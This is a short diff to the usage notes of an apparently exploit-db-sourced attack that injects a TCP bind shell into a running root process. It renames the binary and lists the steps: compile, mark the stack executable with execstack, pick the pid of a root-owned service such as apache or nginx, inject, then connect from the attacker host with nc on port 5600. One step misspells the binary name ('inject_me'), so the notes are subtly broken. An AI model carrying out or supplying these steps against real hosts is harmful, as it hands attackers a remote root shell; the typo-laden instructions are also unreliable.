@@ -9,10 +9,10 @@ https://www.exploit-db.com/exploits/41128
 TCP bind shell
 
 victim host
-1) $ gcc -o bind_shell bind_shell.c
-2) $ execstack -s bind_shell
+1) $ gcc -o inject_mem inject_mem.c
+2) $ execstack -s inject_mem
 3) $ ps -eaf -> find pid number under root (apache, nginx, python, etc)
-4) $ ./bind_shell pid_number
+4) $ ./inject_me pid_number
 
 attacker host
 1) $ nc victim_host 5600
